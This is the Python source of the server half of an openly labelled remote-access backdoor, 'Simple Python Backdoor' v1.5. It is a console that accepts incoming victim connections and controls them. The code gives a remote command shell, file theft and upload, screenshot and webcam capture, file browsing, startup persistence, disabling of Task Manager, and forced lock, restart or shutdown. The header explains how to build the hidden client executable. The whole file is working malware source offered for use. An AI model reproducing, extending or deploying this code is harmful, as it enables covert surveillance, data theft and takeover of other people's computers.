'''
Simple python backdoor by xp4xbox
License: https://github.com/xp4xbox/Simple-Python-Backdoor/blob/master/LICENSE

VERSION 1.5 CHANGELOG:
server is now Linux compatible!
receiving/sending large data is now reliable
file browser now outputs data in the console
other minor changes

Client Requires:

https://pypi.python.org/pypi/PyAutoGUI
https://sourceforge.net/projects/pywin32/
https://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame
https://www.lfd.uci.edu/~gohlke/pythonlibs/#videocapture
http://www.pyinstaller.org/downloads.html

To build client with pyinstaller run:
pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter --onefile --windowed

NOTE: disable your firewall on the server or allow port 3000
'''

import socket, os, time, threading, sys
from queue import Queue

intThreads = 2
arJobs = [1, 2]
queue = Queue()

arAddresses = []
arConnections = []

strHost = "0.0.0.0"
intPort = 3000

if not sys.platform == "linux" or sys.platform == "linux2":
    os.system("title Simple Backdoor v1.5")

# function to return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8")


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while True:
        bytPart = conn.recv(buffer)
        bytData += bytPart
        if len(bytData) == buffer:
            break
    return bytData


def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
    except socket.error() as strError:
        print("Error creating socket " + str(strError))


def socket_bind():
    global objSocket
    try:
        print("Listening on port " + str(intPort))
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)
    except socket.error() as strError:
        print("Error binding socket " + str(strError) + " Retrying...")
        socket_bind()


def socket_accept():
    global blnFirstRun, arAddresses
    while True:
        try:
            conn, arAddress = objSocket.accept()
            conn.setblocking(1)  # no timeout
            arConnections.append(conn)  # append connection to array
            arAddresses.append(arAddress)
            print("\n" + "A user has just connected ;) ....")
        except socket.error:
            print("Error accepting connections!")
            continue


def menu_help():
    print("\n" + "--help")
    print("--l List all connections")
    print("--i Interact with connection")
    print("--e Open remote cmd with connection")
    print("--c Close connection")
    print("--x Exit and close all connections")


def main_menu():
    while True:
        strChoice = input("\n" + "Simple Backdoor: ")

        refresh_connections()  # refresh connection list

        if strChoice == "--l":
            list_connections()
        elif strChoice[:3] == "--i" and len(strChoice) > 3:
            conn = select_connection(strChoice[3:len(strChoice)], "True")
            if conn is not None:
                send_commands()
        elif strChoice == "--help":
            menu_help()
        elif strChoice[:3] == "--c" and len(strChoice) > 3:
            conn = select_connection(strChoice[3:len(strChoice)], "False")
            conn.send(str.encode("exit"))
        elif strChoice == "--x":
            close()
            break  # break to continue work() function
        elif strChoice[:3] == "--e" and len(strChoice) > 3:
            conn = select_connection(strChoice[3:len(strChoice)], "False")
            if conn is not None:
                command_shell()
        else:
            print("Invalid choice, please try again!")
            menu_help()


def close():
    global arConnections, arAddresses

    if len(arAddresses) == 0:  # if there are no computers connected
        return

    for intCounter, conn in enumerate(arConnections):
        conn.send(str.encode("exit"))
        conn.close()
    del arConnections; arConnections = []
    del arAddresses; arAddresses = []


def refresh_connections():  # used to remove any lost connections
    global arConnections, arAddresses
    for intCounter, conn in enumerate(arConnections):
        try:
            conn.send(str.encode("test"))  # test to see if connection is active
        except socket.error:
            del arAddresses[intCounter]
            del arConnections[intCounter]
            conn.close()


def list_connections():
    refresh_connections()
    strClients = ""

    for intCounter, conn in enumerate(arConnections):
        strClients += str(intCounter) + "\t" + str(arAddresses[intCounter][0]) + "\t" + \
                      str(arAddresses[intCounter][1]) + "\n"
    print("\n" + "Users:" + "\n" + strClients)


def select_connection(connection_id, blnGetResponse):
    global conn
    try:
        connection_id = int(connection_id)
        conn = arConnections[connection_id]
    except:
        print("Invalid choice, please try again!")
        return
    else:
        if blnGetResponse == "True":
            print("You are connected to " + arAddresses[connection_id][0] + " ...." + "\n")
        return conn


def user_info():
    conn.send(str.encode("info"))
    strClientResponse = conn.recv(1024)
    strClientResponse = decode_utf8(strClientResponse)
    print(strClientResponse, end="")


def screenshot():
    conn.send(str.encode("screen"))
    strClientResponse = conn.recv(1024).decode("utf-8")  # get info
    print("\n" + strClientResponse)

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    strFile = time.strftime("%Y%m%d%H%M%S" + ".png")

    ScrnData = recvall(intBuffer)  # get data and write it
    objPic = open(strFile, "wb")
    objPic.write(ScrnData); objPic.close()

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")


def webpic():
    conn.send(str.encode("webpic"))
    strClientResponse = conn.recv(1024).decode("utf-8")  # get info

    if strClientResponse == "error":
        print("\n" + "Could not detect webcam!")
        return
    else:
        print("\n" + strClientResponse)

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    strFile = time.strftime("%Y%m%d%H%M%S" + ".png")

    ScrnData = recvall(intBuffer)
    objPic = open(strFile, "wb")
    objPic.write(ScrnData); objPic.close()

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")


def browse_files():
    conn.send(str.encode("filebrowser"))
    print("\n" + "Drives :")

    strDrives = conn.recv(1024).decode("utf-8")
    print(strDrives + "\n")

    strDir = input("Directory: ")

    if strDir == "":
        strDir = "Invalid"

    conn.send(str.encode(strDir))

    strClientResponse = conn.recv(1024).decode("utf-8")  # get buffer size

    if strClientResponse == "Invalid Directory!":  # if the directory is invalid
        print("\n" + strClientResponse)
        return

    intBuffer = int(strClientResponse)
    strClientResponse = decode_utf8(recvall(intBuffer))  # receive full data

    print("\n" + strClientResponse)


def startup():
    conn.send(str.encode("startup"))
    print("Registering ...")

    strClientResponse = conn.recv(1024).decode("utf-8")
    if not strClientResponse == "success":
        print(strClientResponse)


def send_file():
    strFile = input("\n" + "File to send:  ")
    if not os.path.isfile(strFile):
        print("Invalid File!")
        return

    strOutputFile = input("\n" + "Output File: ")
    if strOutputFile == "":  # if the input is blank
        return

    conn.send(str.encode("send" + str(os.path.getsize(strFile))))

    objFile = open(strFile, "rb")  # send file contents and close the file
    time.sleep(1)
    conn.send(objFile.read())
    objFile.close()

    conn.send(str.encode(strOutputFile))

    print("Total bytes sent: " + str(os.path.getsize(strFile)))

    strClientResponse = conn.recv(1024).decode("utf-8")
    print(strClientResponse)


def receive():
    strFile = input("\n" + "Target file: ")
    strFileOutput = input("\n" + "Output File: ")

    if strFile == "" or strFileOutput == "":  # if the user left an input blank
        return

    conn.send(str.encode("recv" + strFile))
    strClientResponse = conn.recv(1024).decode("utf-8")

    print(strClientResponse)

    if strClientResponse == "Target file not found!":
        return

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    file_data = recvall(intBuffer)  # get data and write it

    try:
        objFile = open(strFileOutput, "wb")
        objFile.write(file_data)
        objFile.close()
    except:
        print("Path is protected/invalid!")
        return

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFileOutput)) + " bytes")


def lock_res_shut(args):
    conn.send(str.encode("shutreslock"))
    if args[1] == "1":
        conn.send(str.encode("lock"))
        return "False"

    if args[1] == "2":
        strCommand = "-r"
    elif args[1] == "3":
        strCommand = "-s"
    else:
        print("Invalid Choice!")
        return "False"

    if len(args) > 2:  # if the user is sending a message
        strMessage = args[2:len(args)]
    else:
        strMessage = " none"
    conn.send(str.encode(strCommand + strMessage))
    return "True"


def command_shell():  # remote cmd shell
    conn.send(str.encode("cmd"))
    strDefault = "\n" + conn.recv(1024).decode("utf-8") + ">"
    print(strDefault, end="")  # print default prompt

    while True:
        strCommand = input()
        if strCommand == "quit" or strCommand == "exit":
            conn.send(str.encode("goback"))
            break

        elif strCommand == "cmd":  # commands that do not work
            print("Please do use not this command!")
            print(strDefault, end="")

        elif len(strCommand) > 0:
            conn.send(str.encode(strCommand))
            intBuffer = int(conn.recv(1024).decode("utf-8"))  # receive buffer size
            strClientResponse = decode_utf8(recvall(intBuffer))
            print(strClientResponse, end="")  # print cmd output
        else:
            print(strDefault, end="")


def disable_taskmgr():
    conn.send(str.encode("dtaskmgr"))
    print("Disabling ...")


def show_help():
    print("--help")
    print("--m Send message")
    print("--o Open a website")
    print("--r Receive file from the user")
    print("--s Send file to the user")
    print("--p (1) Take screenshot")
    print("--p (2) Take webcam snapshot")
    print("--a Run at startup")
    print("--v View files")
    print("--x (1) Lock user")
    print("--x (2) Restart user")
    print("--x (3) Shutdown user")
    print("--u User Info")
    print("--e Open remote cmd")
    print("--d Disable task manager")
    print("--b Move connection to background")
    print("--c Close connection")


def send_commands():
    show_help()
    try:
        while True:
            strChoice = input("\n" + "Type selection: ")

            if strChoice == "--help":
                print("\n", end="")
                show_help()
            elif strChoice == "--c":
                conn.send(str.encode("exit"))
                conn.close()
                break
            elif strChoice[:3] == "--m" and len(strChoice) > 3:
                strMsg = "msg" + strChoice[4:len(strChoice)]
                conn.send(str.encode(strMsg))
            elif strChoice[:3] == "--o" and len(strChoice) > 3:
                strSite = "site" + strChoice[4:len(strChoice)]
                conn.send(str.encode(strSite))
            elif strChoice == "--a":
                startup()
            elif strChoice == "--u":
                user_info()
            elif strChoice[:5] == "--p 1":
                screenshot()
            elif strChoice[:5] == "--p 2":
                webpic()
            elif strChoice == "--v":
                browse_files()
            elif strChoice == "--s":
                send_file()
            elif strChoice == "--r":
                receive()
            elif strChoice[:3] == "--x" and len(strChoice) > 3:
                blnClose = lock_res_shut(strChoice[3:len(strChoice)])
                if blnClose == "True":  # if the computer is shutdown
                    conn.close()
                    break
            elif strChoice == "--b":
                break
            elif strChoice == "--e":
                command_shell()
            elif strChoice == "--d":
                disable_taskmgr()
            else:
                print("Invalid choice, please try again!" + "\n")

    except socket.error:  # if there is a socket error
        print("Error, connection was lost!" + "\n")
        return


def create_threads():
    for _ in range(intThreads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def work():  # do jobs in the queue
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept()
        elif intValue == 2:
            while True:
                if len(arAddresses) > 0:
                    time.sleep(0.2)
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThread in arJobs:
        queue.put(intThread)  # put thread id into list
    queue.join()

create_threads()
create_jobs()
